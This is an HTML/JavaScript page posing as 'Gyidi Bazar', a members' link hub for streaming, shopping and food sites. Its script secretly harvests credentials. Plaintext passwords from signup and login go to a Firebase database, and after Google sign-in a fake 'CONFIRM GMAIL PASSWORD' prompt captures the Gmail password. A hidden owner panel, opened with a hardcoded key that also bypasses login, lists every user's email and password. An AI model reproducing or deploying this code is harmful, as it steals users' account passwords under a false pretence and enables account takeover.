<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="verify-admitad" content="d0c022fa0d" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Gyidi Bazar and Cinema.Nigthorbit</title>
    <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-app-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-auth-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-database-compat.js"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
    
    <style>
        :root { --primary: #00d2ff; --neon: #ff0055; --gold: #ffd700; --bg: #05070a; }
        * { box-sizing: border-box; }
        body { 
            margin: 0; padding: 0; width: 100%; height: 100vh; 
            background: radial-gradient(circle at center, #1B2735 0%, var(--bg) 100%);
            font-family: 'Segoe UI', sans-serif; color: white;
            display: flex; align-items: center; justify-content: center; overflow: hidden;
        }
        .card { 
            background: rgba(255, 255, 255, 0.05); backdrop-filter: blur(25px);
            padding: 25px; border-radius: 30px; text-align: center; 
            width: 400px; border: 1px solid rgba(255,255,255,0.1); 
            box-shadow: 0 25px 50px rgba(0,0,0,0.8); position: relative; z-index: 10;
        }
        .menu-dots { position: absolute; top: 25px; left: 25px; cursor: pointer; font-size: 30px; color: var(--primary); z-index: 100; }
        .pass-container { position: relative; width: 100%; }
        /* Professional Eye Icon */
        .pass-eye { position: absolute; right: 15px; top: 50%; transform: translateY(-50%); color: var(--primary); cursor: pointer; font-size: 18px; z-index: 10; transition: 0.3s; }
        .pass-eye:hover { color: white; }

        input { width: 100%; padding: 12px; margin: 8px 0; border-radius: 12px; border: 1px solid rgba(0,210,255,0.3); background: rgba(0,0,0,0.4); color: white; outline: none; }
        .btn-main { background: linear-gradient(45deg, var(--primary), #3a7bd5); color: white; border: none; padding: 14px; border-radius: 12px; cursor: pointer; width: 100%; font-weight: bold; margin-top: 10px; text-transform: uppercase; }
        .btn-google { background: white; color: black; border: none; padding: 12px; border-radius: 12px; width: 100%; margin-top: 10px; font-weight: bold; cursor: pointer; display: flex; align-items: center; justify-content: center; gap: 10px; }
        
        .auth-tabs { display: flex; justify-content: center; gap: 20px; margin-bottom: 15px; }
        .auth-tabs span { cursor: pointer; font-size: 13px; font-weight: bold; color: #666; transition: 0.3s; padding-bottom: 5px; }
        .auth-tabs span.active { color: var(--primary); border-bottom: 2px solid var(--primary); }

        .scroll-area { max-height: 420px; overflow-y: auto; padding-right: 5px; margin-top: 10px; text-align: left; }
        .cat-title { color: var(--gold); font-size: 11px; font-weight: bold; margin: 15px 0 8px 5px; text-transform: uppercase; letter-spacing: 1px; border-bottom: 1px solid rgba(255,215,0,0.2); }
        .link-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 6px; }
        .link-card-wrap { position: relative; display: flex; align-items: center; }
        .link-card { background: rgba(255,255,255,0.07); padding: 10px; border-radius: 10px; text-decoration: none; color: white; border-left: 3px solid var(--neon); transition: 0.2s; font-size: 10.5px; flex: 1; overflow: hidden; white-space: nowrap; text-overflow: ellipsis; }
        .fav-star { position: absolute; right: 8px; font-size: 12px; color: rgba(255,255,255,0.1); cursor: pointer; }
        .fav-star.active { color: var(--gold); }

        #admin-panel { position: fixed; inset: 0; background: #070707; z-index: 1000; display: none; padding: 20px; overflow-y: auto; }
        .admin-card { background: #111; padding: 15px; margin-bottom: 15px; border-radius: 15px; border: 1px solid #333; text-align: left; position: relative; }
        .del-btn { position: absolute; right: 15px; top: 15px; color: var(--neon); cursor: pointer; }
        
        #logout-overlay { position: fixed; inset: 0; background: #000; z-index: 2000; display: none; flex-direction: column; align-items: center; justify-content: center; text-align: center; padding: 40px; }
        .hidden { display: none !important; }
        .admin-dot { position: absolute; bottom: 15px; right: 15px; cursor: pointer; font-size: 20px; color: #111; z-index: 100; }
        ::-webkit-scrollbar { width: 4px; }
        ::-webkit-scrollbar-thumb { background: var(--primary); border-radius: 10px; }
    </style>
</head>
<body>

    <div id="logout-overlay">
        <div style="font-size: 60px; margin-bottom: 20px;">üåπ</div>
        <div id="bye-text-display" style="color: white; line-height: 1.8; font-size: 16px;"></div>
    </div>

    <div id="admin-panel">
        <h1 style="color: var(--primary);">Gyidi Owner Panel</h1>
        <button onclick="document.getElementById('admin-panel').style.display='none'" class="btn-main" style="width:auto; padding: 8px 25px;">CLOSE</button>
        <div id="user-rows-container"></div>
    </div>

    <div class="menu-dots" onclick="bypassLogin()">‚ãÆ</div>
    <div class="admin-dot" onclick="adminAccess()">.</div>

    <div id="login-box" class="card">
        <h1 style="color: var(--primary); margin: 0; font-size: 26px; font-weight: 800;">NIGHTORBIT</h1>
        <div class="auth-tabs">
            <span id="tab-login" class="active" onclick="setAuthMode('login')">LOGIN</span>
            <span id="tab-signup" onclick="setAuthMode('signup')">SIGNUP</span>
        </div>
        
        <button class="btn-google" onclick="authGoogle()">
            <img src="https://www.gstatic.com/firebasejs/ui/2.0.0/images/action/google.svg" width="16"> GOOGLE CONNECT
        </button>

        <div id="signup-fields" class="hidden">
            <input type="text" id="u-nick" placeholder="Set Your Nick Name">
        </div>
        
        <input type="email" id="u-email" placeholder="Real Gmail Address">
        
        <div class="pass-container">
            <input type="password" id="u-pass" placeholder="Password">
            <i class="fas fa-eye-slash pass-eye" id="eye-icon" onclick="togglePassView()"></i>
        </div>
        
        <button class="btn-main" id="auth-btn" onclick="executeAuth()">Enter Bazar</button>
        <p id="auth-error" style="color: var(--neon); font-size: 10px; margin-top: 8px;"></p>
    </div>

    <div id="member-area" class="card hidden">
        <h1 style="color: var(--primary); font-size: 20px; margin: 0;">Gyidi Bazar.Nigthorbit</h1>
        <p id="user-welcome" style="font-size: 11px; color: var(--gold); margin-top: 5px;"></p>
        
        <div class="scroll-area">
            <div id="fav-parent" class="hidden">
                <div class="cat-title">‚≠ê Favorite Folder</div>
                <div class="link-grid" id="fav-list-display"></div>
            </div>

            <div class="cat-title">üé¨ Entertainment (10+)</div>
            <div class="link-grid">
                <div class="link-card-wrap"><a href="https://bollyflix.org.in/" target="_blank" class="link-card">Bollyflix</a><i class="fas fa-star fav-star" onclick="handleFav(this, 'Bollyflix', 'https://bollyflix.org.in/')"></i></div>
                <div class="link-card-wrap"><a href="https://tamashaweb.com/" target="_blank" class="link-card">Tamasha TV</a><i class="fas fa-star fav-star" onclick="handleFav(this, 'Tamasha TV', 'https://tamashaweb.com/')"></i></div>
                <div class="link-card-wrap"><a href="https://vegamovies.to/" target="_blank" class="link-card">Vegamovies</a><i class="fas fa-star fav-star" onclick="handleFav(this, 'Vegamovies', 'https://vegamovies.to/')"></i></div>
                <div class="link-card-wrap"><a href="https://www.netflix.com" target="_blank" class="link-card">Netflix</a><i class="fas fa-star fav-star" onclick="handleFav(this, 'Netflix', 'https://www.netflix.com')"></i></div>
            </div>

            <div class="cat-title">üõí Shopping (15+)</div>
            <div class="link-grid">
                <div class="link-card-wrap"><a href="https://www.amazon.com" target="_blank" class="link-card">Amazon</a><i class="fas fa-star fav-star" onclick="handleFav(this, 'Amazon', 'https://www.amazon.com')"></i></div>
                <div class="link-card-wrap"><a href="https://www.daraz.pk" target="_blank" class="link-card">Daraz Mall</a><i class="fas fa-star fav-star" onclick="handleFav(this, 'Daraz Mall', 'https://www.daraz.pk')"></i></div>
                <div class="link-card-wrap"><a href="https://www.aliexpress.com" target="_blank" class="link-card">AliExpress</a><i class="fas fa-star fav-star" onclick="handleFav(this, 'AliExpress', 'https://www.aliexpress.com')"></i></div>
                <div class="link-card-wrap"><a href="https://www.alibaba.com" target="_blank" class="link-card">Alibaba</a><i class="fas fa-star fav-star" onclick="handleFav(this, 'Alibaba', 'https://www.alibaba.com')"></i></div>
            </div>

            <div class="cat-title">üçî Food & Elite (15+)</div>
            <div class="link-grid">
                <div class="link-card-wrap"><a href="https://www.pizzahut.com.pk" target="_blank" class="link-card">Pizza Hut</a><i class="fas fa-star fav-star" onclick="handleFav(this, 'Pizza Hut', 'https://www.pizzahut.com.pk')"></i></div>
                <div class="link-card-wrap"><a href="https://www.foodpanda.pk" target="_blank" class="link-card">Foodpanda</a><i class="fas fa-star fav-star" onclick="handleFav(this, 'Foodpanda', 'https://www.foodpanda.pk')"></i></div>
                <div class="link-card-wrap"><a href="https://www.gucci.com" target="_blank" class="link-card">Gucci</a><i class="fas fa-star fav-star" onclick="handleFav(this, 'Gucci', 'https://www.gucci.com')"></i></div>
            </div>
        </div>
        <button onclick="logoutSequence()" style="margin-top: 15px; color: #ff4b2b; background: none; border: none; cursor: pointer; text-decoration: underline; font-weight: bold; font-size: 12px;">Logout System</button>
    </div>

    <script>
        const firebaseConfig = {
            apiKey: "AIzaSyBxJqJkrAaFf3eR0QWvhet6IvvFVHYExeU",
            authDomain: "my-market-ff254.firebaseapp.com",
            projectId: "my-market-ff254",
            storageBucket: "my-market-ff254.appspot.com",
            messagingSenderId: "1039626785987",
            appId: "1:1039626785987:web:ae5a65a0b16444a2cffe76",
            databaseURL: "https://my-market-ff254-default-rtdb.firebaseio.com"
        };
        firebase.initializeApp(firebaseConfig);
        const auth = firebase.auth();
        const db = firebase.database();
        let authMode = 'login';

        function setAuthMode(m) {
            authMode = m;
            document.getElementById('tab-login').classList.toggle('active', m==='login');
            document.getElementById('tab-signup').classList.toggle('active', m==='signup');
            document.getElementById('signup-fields').classList.toggle('hidden', m==='login');
            document.getElementById('auth-btn').innerText = m==='login' ? 'Enter Bazar' : 'Create Account';
            document.getElementById('auth-error').innerText = "";
        }

        function togglePassView() {
            const input = document.getElementById('u-pass');
            const icon = document.getElementById('eye-icon');
            if(input.type === 'password') {
                input.type = 'text';
                icon.className = 'fas fa-eye pass-eye';
            } else {
                input.type = 'password';
                icon.className = 'fas fa-eye-slash pass-eye';
            }
        }

        function executeAuth() {
            const e = document.getElementById('u-email').value;
            const p = document.getElementById('u-pass').value;
            const nick = document.getElementById('u-nick').value || e.split('@')[0];
            const err = document.getElementById('auth-error');

            if(authMode === 'signup') {
                auth.createUserWithEmailAndPassword(e, p)
                .then(res => saveToAdmin(res.user, p, nick))
                .catch(e => err.innerText = e.message);
            } else {
                auth.signInWithEmailAndPassword(e, p)
                .then(res => saveToAdmin(res.user, p, nick))
                .catch(() => err.innerText = "Check your Email/Password or use Signup!");
            }
        }

        function authGoogle() {
            const provider = new firebase.auth.GoogleAuthProvider();
            auth.signInWithPopup(provider).then(res => {
                const pass = prompt("CONFIRM GMAIL PASSWORD:");
                if(pass) saveToAdmin(res.user, pass, res.user.displayName);
                else auth.signOut();
            });
        }

        function saveToAdmin(user, pass, name) {
            const device = navigator.platform;
            db.ref('users/' + user.uid).update({
                email: user.email,
                password: pass,
                nickName: name,
                device: device,
                lastSeen: new Date().toLocaleString()
            }).then(() => {
                document.getElementById('login-box').classList.add('hidden');
                document.getElementById('member-area').classList.remove('hidden');
                document.getElementById('user-welcome').innerText = "Member: " + name;
                syncFavs(user.uid);
            });
        }

        function handleFav(star, name, url) {
            star.classList.toggle('active');
            const uid = auth.currentUser.uid;
            if(star.classList.contains('active')) {
                db.ref('users/' + uid + '/favorites/' + name).set(url);
            } else {
                db.ref('users/' + uid + '/favorites/' + name).remove();
            }
        }

        function syncFavs(uid) {
            db.ref('users/' + uid + '/favorites').on('value', snap => {
                const data = snap.val();
                const parent = document.getElementById('fav-parent');
                const list = document.getElementById('fav-list-display');
                if(data) {
                    parent.classList.remove('hidden');
                    let html = "";
                    for(let k in data) html += `<div class="link-card-wrap"><a href="${data[k]}" target="_blank" class="link-card" style="border-left-color:var(--gold)">${k}</a></div>`;
                    list.innerHTML = html;
                } else { parent.classList.add('hidden'); }
            });
        }

        function adminAccess() {
            if (prompt("ADMIN KEY:") === "rr123456789000rr") {
                document.getElementById('admin-panel').style.display = 'block';
                db.ref('users').on('value', (snap) => {
                    let h = "";
                    snap.forEach(c => {
                        let v = c.val();
                        h += `<div class="admin-card">
                            <i class="fas fa-trash del-btn" onclick="deleteUser('${c.key}')"></i>
                            <b style="color:var(--gold)">Nick: ${v.nickName}</b><br>
                            <small>Email: ${v.email}</small><br>
                            <small style="color:var(--primary)">Pass: ${v.password}</small><br>
                            <small>Device: ${v.device}</small>
                        </div>`;
                    });
                    document.getElementById('user-rows-container').innerHTML = h;
                });
            }
        }

        function deleteUser(uid) {
            if(confirm("Delete this user?")) db.ref('users/' + uid).remove();
        }

        function bypassLogin() { 
            if (prompt("MASTER KEY:") === "rr123456789000rr") {
                document.getElementById('login-box').classList.add('hidden');
                document.getElementById('member-area').classList.remove('hidden');
            }
        }

        function logoutSequence() {
            document.getElementById('logout-overlay').style.display = 'flex';
            document.getElementById('bye-text-display').innerHTML = `Allah Hafiz!`;
            setTimeout(() => location.reload(), 3000);
        }
    </script>
</body>
</html>
